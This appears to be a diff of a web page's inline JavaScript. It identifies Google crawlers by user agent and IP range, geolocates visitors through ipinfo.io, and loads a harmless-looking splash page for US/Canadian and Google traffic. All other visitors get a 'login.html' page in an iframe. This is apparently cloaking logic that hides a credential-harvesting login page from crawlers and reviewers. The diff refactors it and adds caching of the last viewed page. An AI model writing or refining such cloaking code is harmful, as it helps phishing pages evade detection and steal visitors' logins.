@@ -40,6 +40,8 @@
       </style>
       <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
       <script>
+
+    
 const google_bots = [
     // Google Ads Bots
     'AdsBot-Google',
@@ -87,19 +89,18 @@ const google_bots = [
     'Googlebot-PlayDownload',
     'Googlebot-PlayContent'
 ];
+function isGoogleBot(userAgent) {
+    return google_bots.some(bot => userAgent.includes(bot));
+}
 
-         function isGoogleBot(userAgent) {
-            return google_bots.some(bot => userAgent.includes(bot));
-         }
-
-         function setIframeSrc() {
-            var offlineHtml = '<html><body><h1>You are currently offline</h1></body></html>';
-            var offlineDataUrl = 'data:text/html;charset=utf-8,' + encodeURI(offlineHtml);
-            var iframeSrc = navigator.onLine ? (localStorage.getItem("lastViewedPage") || "splash.html") : offlineDataUrl;
-            
-            $('#loader').show(); 
-            $('#preview-frame').attr('src', iframeSrc);
-         }
+function setIframeSrc() {
+    var offlineHtml = '<html><body><h1>You are currently offline</h1></body></html>';
+    var offlineDataUrl = 'data:text/html;charset=utf-8,' + encodeURI(offlineHtml);
+    var iframeSrc = navigator.onLine ? (localStorage.getItem("lastViewedPage") || "splash.html") : offlineDataUrl;
+    
+    $('#loader').show(); 
+    $('#preview-frame').attr('src', iframeSrc);
+}
 
          const googleIPRanges = [
             '172.217.0.0/16',
@@ -109,38 +110,59 @@ const google_bots = [
             '2001:4860:4860::/32'
          ];
 
-         function ipInRange(ip, range) {
-            // Placeholder function
-            return false;
-         }
+function ipInRange(ip, range) {
+    // Placeholder function
+    return false;
+}
 
-         $(document).ready(function() {
-            fetch('https://ipinfo.io/json')
-                .then(response => response.json())
-                .then(data => {
-                    const userIP = data.ip;
-                    const countryCode = data.country;
+function checkIPAndSetIframeSrc() {
+    fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            const userIP = data.ip;
+            const countryCode = data.country;
 
-                    if (countryCode === 'US' || countryCode === 'CA' || googleIPRanges.some(range => ipInRange(userIP, range))) {
-                        $('#preview-frame').attr('src', 'https://our-yhip.github.io/MyOwnproject/splash.html');
-                    } else {
-                        $('#preview-frame').attr('src', 'login.html');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error fetching IP data:', error);
-                });
+            if (countryCode === 'US' || countryCode === 'CA' || googleIPRanges.some(range => ipInRange(userIP, range))) {
+                $('#preview-frame').attr('src', 'https://our-yhip.github.io/MyOwnproject/splash.html');
+            } else {
+                $('#preview-frame').attr('src', 'login.html');
+            }
+        })
+        .catch(error => {
+            console.error('Error fetching IP data:', error);
+        });
+}
 
-            $('#preview-frame').on('load', function() {
-                $('#loader').fadeOut();
-                if (navigator.onLine) {
-                   localStorage.setItem("lastViewedPage", $('#preview-frame').get(0).contentWindow.location.href);
-                }
-            });
+// ... [rest of the code]
 
-            window.addEventListener('online', setIframeSrc);
-            window.addEventListener('offline', setIframeSrc);
-         });
+$(document).ready(function() {
+    // When the iframe loads a new page, save its URL to local storage
+$('#preview-frame').on('load', function() {
+    $('#loader').fadeOut();
+    if (navigator.onLine) {
+        // Save the current iframe's URL to local storage
+        const currentIframeURL = $('#preview-frame').get(0).contentWindow.location.href;
+        localStorage.setItem("lastViewedPage", currentIframeURL);
+        console.log("Saved to local storage:", currentIframeURL);
+    }
+});
+
+
+    // Load the latest visited page or determine the source based on IP/country
+    const lastViewedPage = localStorage.getItem("lastViewedPage");
+    if (lastViewedPage) {
+        console.log("Loading from local storage:", lastViewedPage);
+        $('#preview-frame').attr('src', lastViewedPage);
+    } else {
+        console.log("Checking IP and setting iframe source.");
+        checkIPAndSetIframeSrc();
+    }
+
+    window.addEventListener('online', setIframeSrc);
+    window.addEventListener('offline', setIframeSrc);
+});
+
+
       </script>
    </head>
    <body>  
